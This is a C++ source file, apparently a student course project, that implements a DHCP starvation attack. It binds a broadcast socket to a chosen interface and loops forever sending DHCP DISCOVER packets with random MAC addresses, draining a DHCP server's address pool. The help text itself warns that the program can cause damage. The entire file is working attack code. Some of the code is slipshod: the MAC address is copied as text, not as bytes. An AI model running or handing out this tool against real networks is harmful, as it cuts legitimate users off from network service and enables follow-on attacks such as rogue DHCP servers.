#include <unistd.h>
#include <sys/time.h>
#include <sys/ioctl.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <fcntl.h>
#include <linux/if.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>
#include <netinet/in.h>
#include <netinet/ether.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <iostream>
#include <arpa/inet.h>
#include <netdb.h>
#include <signal.h>
#include <getopt.h>
#include <thread>
#include <chrono>
#include <vector>
#include <sstream>
#include <fstream>
#include <utility>
#include "dhcp.h"

using namespace std;
int sock;
/*
* Source:
* http://www.cplusplus.com/forum/beginner/188363/
*/
char LetterAssign(int x)
{
	char l;
	if(x==10) l='A';
	if(x==11) l='B';
	if(x==12) l='C';
	if(x==13) l='D';
	if(x==14) l='E';
	if(x==15) l='F';
	return l;
}
/*
* Source:
* http://www.cplusplus.com/forum/beginner/188363/
*/
string RandomMac()
{
	string mac;
	for(int i=0; i<12; i++)
	{
		if(i>0?(i)%2==0:0) mac+=":";
		
		int x=rand()%16;
		if(x>9)
		{
			char letter=LetterAssign(x);
			mac+=letter;
		}
		else
		{
			mac+=to_string(x);
		}
	}
	return mac;
}

void sigHandler(int signal) 
{
    cerr << "Error: Nečekané ukončení útoku!!!"<< endl;
    close(sock);
    exit(0);
}


int main(int argc, char *argv[])
{
	srand (time(NULL));
	signal(SIGINT, sigHandler);
	string interface = "";
	int c;
	const char *short_opt = "hi";
	struct option long_opt[] =
	{
		{"help",no_argument,NULL,'h'},
		{"interface",required_argument, NULL,'i'},
		{NULL,0,NULL,0}
	};
	while ((c = getopt_long(argc, argv, short_opt,long_opt,NULL)) != -1)
	{
		switch(c)
		{
			case 'i':
				interface.append(argv[2]);
			break;
			case 'h':
				cout << "This program is project to subject IPK. It was made by Adam Petráš in 2018.\n\
	Please be carefull its very dangerous run this program via internet.\n\
	It can cause damage on property.\n\nPlease Enter:\n\t-i *name* (--interface *name*) name of interface in OS.\n\
		Via linux command \"nmcli dev status\".\n\t-h(--help) its the help for this program.\n";
				exit(0);
			break;
			default:
				cerr << "ERROR: Arguments please call help -h(--help)." <<endl;
				exit(-1);
			break;
		}
	}
		struct ifreq ifreq;
		struct sockaddr_in addr;
		struct dhcp_packet_struct dhcp;
		struct sockaddr_in packet;
		//okopirovaní jmena do ifreq
		strcpy(ifreq.ifr_name, interface.c_str());
		bzero(&addr,sizeof(addr));
		//nastavení typu komunikace
		addr.sin_family = AF_INET;
		//nastavení adresy
		addr.sin_addr.s_addr = INADDR_ANY;
		//nastavení portu
		addr.sin_port = htons(DHCP_CLIENT_PORT);
		int temp = 1;
		if ((sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1)
		{
			cerr << "ERROR: creating socket" <<endl;
			exit(-1);
		}
		if(setsockopt(sock,SOL_SOCKET,SO_REUSEADDR,(char *)&temp,sizeof(temp))<0)
		{
			cerr << "ERROR: I cant set address on socket." <<endl;
			exit(-1);
		}
		if(setsockopt(sock,SOL_SOCKET,SO_BROADCAST,(char *)&temp,sizeof(temp))<0)
		{
			cerr << "ERROR: I cant set broadcast on socket." <<endl;
			exit(-1);
		}
		if(setsockopt(sock,SOL_SOCKET,SO_BINDTODEVICE,(char *)&ifreq,sizeof(ifreq))<0)
		{
			cerr << "ERROR: I cant bind to interface." <<endl;
			exit(-1);
		}
		if(bind(sock,(struct sockaddr *)&addr,sizeof(addr))<0)
		{
			cerr << "ERROR: I cant bind to socket." <<endl;
			exit(-1);
		}
	while(true)
	{
		#pragma region
			//nastavení opcode zpravy
			dhcp.opcode = 1;	//bootrequest
			//nastavení typu hardware
			dhcp.hardwareType = 1;
			//nastavení délky hardware adresy
			dhcp.hardwareAdrLen = ETH_ALEN;
			//počet hopů
			dhcp.numOfHops = 0;
			//počet sekund za který bude klient pracovat
			dhcp.secSinceClientStartedLooking = 0;
			//nastavení flagu
			dhcp.flags = htons(DHCP_BROADCAST_FLAG);
			//nastavení náhodného ID
			dhcp.transactionId = htonl(random());
			//klientova adresa
			inet_aton("0.0.0.0", (struct in_addr *) &dhcp.clientIP);
			//druhá klientova adresa
			inet_aton("0.0.0.0", (struct in_addr *) &dhcp.secondIP);
			//serverová adresa
			inet_aton("0.0.0.0", (struct in_addr *) &dhcp.serverIP);
			//adresa dhcp serveru
			inet_aton("0.0.0.0", (struct in_addr *) &dhcp.dhcpIP);
			//kopírování zdrojové mac do dhcp packetu
			string mac = RandomMac();
			memcpy(dhcp.clientHardwareAddr, mac.c_str(), ETHER_ADDR_LEN);
			//vynulování servername
			bzero(dhcp.serverName, sizeof(dhcp.serverName));
			//vynulování file name
			bzero(dhcp.fileName, sizeof(dhcp.fileName));
			//vynulování optionů
			bzero(dhcp.options, sizeof(dhcp.options));
			dhcp.options[0]='\x63';
			dhcp.options[1]='\x82';
			dhcp.options[2]='\x53';
			dhcp.options[3]='\x63';
			dhcp.options[4]=53;
			dhcp.options[5]='\x01';
			dhcp.options[6]=1;
			dhcp.options[7]=255;
		#pragma endregion DHCP packet
		//nastavení typu
		packet.sin_family = AF_INET;
		//nastavení protokolu
		packet.sin_port = htons(DHCP_SERVER_PORT);
		packet.sin_addr.s_addr = INADDR_BROADCAST;
		bzero(&packet.sin_zero,sizeof(packet.sin_zero));
		if(sendto(sock,(char *)&dhcp,sizeof(dhcp),0,(struct sockaddr *)&packet,sizeof(packet)) == -1)
		{
			exit(-1);
		}
		cout <<" MAC: "<< mac <<endl;
		cout<< "Discovery packet sent!" << endl;
	}
	return 0;
} 